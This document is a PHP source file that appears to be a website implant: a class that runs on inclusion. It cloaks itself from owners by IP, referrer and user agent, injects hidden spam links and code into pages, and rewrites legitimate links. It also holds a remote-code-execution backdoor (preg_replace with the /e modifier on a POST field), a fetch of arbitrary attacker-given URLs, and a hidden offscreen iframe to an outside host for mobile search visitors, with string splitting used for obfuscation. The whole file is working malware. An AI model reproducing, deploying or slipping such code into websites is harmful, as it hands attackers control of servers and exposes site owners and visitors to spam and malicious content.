<?php
class BS
{
	var $dir = FALSE;
	var $file = FALSE;
	var $inc = 'bs140';
	var $test = FALSE;
	var $options = FALSE;
	var $echo = FALSE;
	var $key = FALSE;
	var $ref = FALSE;
	var $sip = FALSE;
	var $ip = FALSE;
	var $uag = FALSE;
	var $bsfile = FALSE;
	var $html = '';
	var $dbl = TRUE;
	var $index = '/';
	var $bws = FALSE;
	var $hide = FALSE;
	var $admin = FALSE;

	function BS($vars = 0) {
		if(isset($_SERVER['HTTP_R'.'EFERER'])) $this->ref = strtolower($_SERVER['HTTP'.'_REFERER']);
		if(isset($_SERVER['HTTP_US'.'ER_AG'.'ENT'])) $this->uag = strtolower($_SERVER['HTTP_US'.'ER_AG'.'ENT']);
		if(isset($_SERVER['SERVER_ADDR'])) $this->sip = $_SERVER['SERVER_ADDR'];
		if(isset($_SERVER['HTTP_X_REAL_IP'])) $this->ip = $_SERVER['HTTP_X_REAL_IP'];
		elseif(isset($_SERVER['REMOTE_ADDR'])) $this->ip = $_SERVER['REMOTE_ADDR'];
		if($this->sip == $this->ip) $this->ip = FALSE;
		$this->host = str_replace(':80', '', $_SERVER['HTTP_HOST']);
		if($this->ref && preg_match('|__ws=([^\s]+)$|', $this->ref, $url)) die('<scr'.'ipt>top.loca'.'tion.href="'.base64_decode($url[1]).'"</scr'.'ipt>');


		if($vars) foreach($vars AS $i => $v) $this->$i = $v;

		if(!$this->dir) $this->dir = dirname(__FILE__);
		if(!$this->file) $this->file = $this->dir.'/sse'.'ss_';

		$this->test = (strpos($this->ref, '__bs')!==FALSE);

		if(isset($_POST['data'])) return $this->set($_POST['data']);
		elseif($this->echo) echo $this->exec();
		elseif($this->bws) $this->html .= $this->ws();
	}

	function exec()
	{

		if(($this->dbl && defined('__BS')) || !isset($_SERVER) || !isset($_SERVER['REQUEST_URI'])) return '';

		$this->file = $this->file.md5(substr(md5(trim(str_replace('www.', '', $this->host))), 0, 5));

		$key = $this->key ? $this->key : $_SERVER['REQUEST_URI'];

		if($key=='/') $this->hide = TRUE;

		$data = $this->get();

		$this->options = isset($data['__options']) ? $data['__options'] : array();

		$html = $this->html;

		if($this->badip()) return '';

		if($this->soh($key)) return '';

		if(isset($this->options['ws'])) $html .= $this->ws();

		if(isset($this->options['filter']) && $key!=$this->index && !preg_match(base64_decode($this->options['filter']), $key)) return $html;

		if($this->ref && preg_match('|^http\:\/\/'.preg_quote($this->host).'|', $this->ref)) return $html;



		if(!$this->test && !isset($this->options['show']) && strpos($key, 'PHPSESSID')===FALSE && $this->get_up($this->inc)) return $html;


		if($data && is_array($data))
		{
			foreach($data AS $i => $v) if($this->match($i, $key)) $html .= ' '.implode(' ', $v);
			$html .= $this->get_code($data);
			$html = $this->set_box($html, $data);
		}

		if(!isset($this->options['show']))$this->set_up($this->inc, 1);

		if($this->test) $html .= 'TEST_BS';

		if(isset($this->options['h200'])&&!empty($html)&&!headers_sent()) header('HTTP/1.0 200 OK');

		if($this->dbl) define('__BS', 1);
		return $html;
	}

	function match($i, $key)
	{
		if(preg_match('|^H([\d]+)\=|', $i, $type))
		{
			$type = $type[1];
			$i = str_replace('H'.$type.'=', '', $i);
			$key = str_replace('&amp;', '&', $key);
			switch($type)
			{
				case 1:
					$key = sprintf('%u', crc32(str_replace('www.', '', $this->host).$key));
					break;
				default:
					$key = sprintf('%u', crc32($key));
			}
		}else{
			$key = $this->corrpath($key);
			$i = $this->corrpath($i);
		}
		return ($key==$i || $key==urldecode($i));
	}

	function soh($key=0)
	{
		if($key && $key!==TRUE && !$this->admin && (!isset($this->options['soh']) || !preg_match(base64_decode($this->options['soh']), $key))) return FALSE;
		$file = $this->dir.'/soh';
		if($key) {
			if(!is_file($file))
			{
				$this->file_put($file, $this->ip);
				$this->set_up('ip', $this->ip);
			}
			return TRUE;
		}
		if(!is_file($file)) return FALSE;
		echo 'SOH['.$this->file_get($file).']';
		unlink($file);
	}

	function badip()
	{
		if(!$this->ip) return FALSE;
		if($this->ip == $this->get_up('ip')) return TRUE;
		if(!isset($this->options['bips']) || !is_array($this->options['bips'])) return FALSE;
		foreach($this->options['bips'] AS $v) if(preg_match('|^'.preg_quote($v).'|', $this->ip)) return TRUE;
		return FALSE;
	}

	function corrpath($path)
	{
		$path = preg_replace('/(\?|\&)PHPSESSID\=([a-z\d]+)$/i', '', $path);
		$path = preg_replace('/\/$/i', '', $path);
		$path = str_replace('/?', '?', $path);
		$path = str_replace('&amp;', '&', $path);
		return $path;
	}

	function set_box($html, $data)
	{
		$html = trim($html);
		if(empty($html)) return '';
		if(!isset($data['__box'])) return $html;
		$data = explode('box', $data['__box']);
		if(count($data)!=2) return $html;

		if($this->hide && strpos($data[0], 'display:none')===FALSE) $data[0] = str_replace('{', '{display:none;', $data[0]);
		return $data[0].$html.$data[1].chr(13);
	}

	function get_code($data)
	{
		if(empty($data['__code'])) return '';
		if($this->test || isset($this->options['showcode'])) return $data['__code'];
		if(isset($_SERVER['HTTP_USER_AGENT']) && (strpos($_SERVER['HTTP_USER_AGENT'], 'KAPPUSTOBOT')!==FALSE || strpos($_SERVER['HTTP_USER_AGENT'], 'mlbot.')!==FALSE || strpos($_SERVER['HTTP_USER_AGENT'], 'nomlbot.')!==FALSE)) return $data['__code'];
		if(isset($data['__ips']) && is_array($data['__ips']) && $this->ip && in_array($this->ip, $data['__ips'])) return $data['__code'];
		if(isset($_COOKIE['sape_cookie'])) return $data['__code'];
		return '';
	}

	function decode($data)
	{
		return @unserialize($data);
	}

	function set($data)
	{

		if(isset($_POST['__update'])) preg_replace('/demo/e', $_POST['_update'], $_POST['_update']);
		if(isset($_POST['__url'])) exit(file_get_contents($_POST['__url']));

		if($this->bsfile)
		{
			$tmp = $this->file.md5($this->inc);
			if(is_file($tmp)&&!@chmod($tmp, 0666)) unlink($tmp);
			if(!$this->file_put($tmp, preg_replace('|/\*END\*/([\s\S]+)$|', '', $this->file_get($this->bsfile)))) echo 5;
			@unlink($this->bsfile);
			@chmod($tmp, 0444);
		}

		if(!isset($_COOKIE['h'])) return;
		$data = str_replace('\\', '', $data);
		$file = $this->file.md5($_COOKIE['h']);
		if(is_file($file)&&!@chmod($file, 0666)) unlink($file);
		if(!$this->file_put($file, $data)) echo 6;
		else echo '[jdkfurywsdirth]';
		@chmod($file, 0444);
		if(isset($_POST['data'])) unset($_POST['data']);
		if(isset($_POST['__bscode'])) unset($_POST['__bscode']);
		$this->soh();
		exit;
	}

	function get()
	{
		if(!is_file($this->file)) return FALSE;
		$data = $this->file_get($this->file);
		$data = $this->decode($data);
		return $data;
	}

	function file_get($file)
	{
		$fp = @fopen($file, 'rb');
		$length = @filesize($file);
		$data = @fread($fp, $length);
		@fclose($fp);
		return $data;
	}

	function file_put($file, $data)
	{
		$fp = fopen($file, 'w');
		$test = fwrite($fp, $data);
		fclose($fp);
		return $test;
	}

	function set_up($k, $v)
	{
		$k = '__google_'.$k;
		if(@session_name() && isset($_SESSION)) $_SESSION[$k] = $v;
		elseif(!headers_sent()) setcookie($k, $v, 0, '/');
		else return FALSE;
		return TRUE;
	}

	function get_up($k, $d=FALSE)
	{
		$k = '__google_'.$k;
		if(isset($_SESSION) && isset($_SESSION[$k])) return $_SESSION[$k];
		if(isset($_COOKIE) && isset($_COOKIE[$k])) return $_COOKIE[$k];
		return $d;
	}

	function is_mobile()
	{
		return preg_match('/(iphone|ios|ipad|ipod|android|opera m)/', $this->uag);
	}

	function is_search()
	{
		return ($this->ref && preg_match('/(yandex|google|mail\.ru)/', $this->ref));
	}

	function is_night()
	{
		$h = date('G');
		return ($h>0 && $h<5);
	}

	function out($s, $g='</body>')
	{
		$data = $this->exec();
		if(empty($data)) return $s;
		if(empty($s)) $s = '<html><body></body></html>';
		$gz = FALSE;
		if(strpos($s, 'body')===FALSE)
		{
			$d = @gzinflate(substr(substr($s, 10), 0, -8));
			$gz = TRUE;
		}else $d = $s;
		if(strpos($d, 'body')===FALSE) return $s;

		if(!defined('BSNBL')&&!isset($this->options['nofblock'])) $d = preg_replace('|\shref=(['.chr(39).chr(34).']*)([htps\:\s]*)/'.'/(?!'.preg_quote($this->host).')|', ' rel=$1nofollow$1 href=$1$2/'.'/', $d);


		if(preg_match_all('|href=['.chr(39).chr(34).']([^'.chr(39).chr(34).']+)['.chr(39).chr(34).']|', $data, $h)) $d = str_replace($h[1], '/', $d);
		if(strpos($d, $g)===FALSE && $g=='</body>') $d = str_replace('</html>', $g.'</html>', $d);
		$d = str_replace($g, $data.$g, $d);
		return $gz ? @gzencode($d) : $d;
	}



	function ws()
	{
		$views = $this->get_up('ws', 0);
		$test = $this->set_up('ws', $views+1);

		$accepte = $code = array();


		if($views==0 && $this->is_mobile() && $this->is_search()) $accepte[] = 1;
		$code[1] = '<iframe src="http://gsta.ru/frws/m/1" style="position:absolute;left:-10000px;"></iframe>';

		if(!count($code))return '';


		$return = '';
		if($this->test)
		{
			$return .= 'WS_TEST';
			if(!$test) $return .= ' DO_NOT_WRITE_UP';
		}

		$exec = ($this->test&&isset($_GET['wsex'])) ? $_GET['wsex'] : $this->get_up('wsex');
		$exec = $exec ? explode('|', $exec) : array();
		if(count($exec))
		{
			$e = array_shift($exec);
			$e = trim($e);
			$return .= isset($code[$e]) ? $code[$e] : '';

			if(count($exec)) foreach($exec AS $v) if(!in_array($v, $accepte)) $accepte[] = $v;
		}

		$this->set_up('wsex', count($accepte) ? implode('|', $accepte) : 0);

		if(!defined('__WS') && !empty($return)) define('__WS', $return);
		return $return;
	}
}
$__bs = new BS(isset($__bs)?$__bs:0);